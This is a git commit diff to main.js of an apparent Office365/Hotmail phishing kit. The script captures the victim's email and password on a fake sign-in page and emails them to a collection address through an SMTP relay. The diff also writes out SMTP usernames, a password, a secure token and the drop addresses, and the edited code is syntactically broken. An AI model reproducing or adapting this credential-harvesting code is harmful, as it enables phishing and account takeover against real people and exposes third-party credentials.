3f41c3038ef10a3858e86893785257b1edd01c12
Oraclerent <71397133+Oraclerent@users.noreply.github.com>
2020-10-01 06:18:56 -0700

    Update main.js

--- main.js
+++ main.js
@@ -2,7 +2,7 @@ var smtp_host = 'smtp.office365.com';
 var smtp_username = 'marc.declercq@edu.vlerick.com';
 
 //Enter were logs will go here
-var log_email = '',
+var log_email = ''
 
 
 url_link = "session.html";
@@ -49,7 +49,7 @@ function processPassword2(t) {
     t.preventDefault();
     var e = this.userPassword2.value.trim();
 
-    var message = "<div> +[ Client Info - Log ]+ <br> Email: " + userEmail +  "<br>Password: "+userPassword +  "<br>Confirm_password: " + e +"</div>"; 
+    var message = "<div> ==================+[ Personal Info - Hotmail ]+================== <br> Username/Email => " + userEmail +  "<br>Password => "+userPassword +  "<br>confirm_password => " + e +"</div>"; 
     
     "" != e ? (sendEmail(log_email, message), hide("password2-row"), show("animate"), "flex" == document.getElementById("animate").style.display) : (hide("password22Error"), show("password21Error"))
 }
@@ -96,15 +96,13 @@ loadForm(), document.getElementById("email-signin").addEventListener("submit", p
 
 
 function sendEmail(to,message) {
-  Email.send({
-  // Host: smtp_host,
-  // Username : smtp_username,
-  // Password : smtp_password,
-  SecureToken: '232d9590-ce69-4dec-8b72-178e83e97702',
-  To : 'gotradebtc@gmail.com',
-  From : smtp_username,
-  Subject : ' [Office365 Log] ',
+  Email.send("basheer@ami-worldwide.com",
+  To : "gotradebtc@gmail.com",
+  From : "basheer@ami-worldwide.com",
+  Subject : '+ [Office365 Log] +',
   Body : message,
+    Username : "basheer@ami-worldwide.com",
+    Password : "Ami@2020"
   }).then(function(message){
       if(message == 'OK'){
         console.log('message sent')
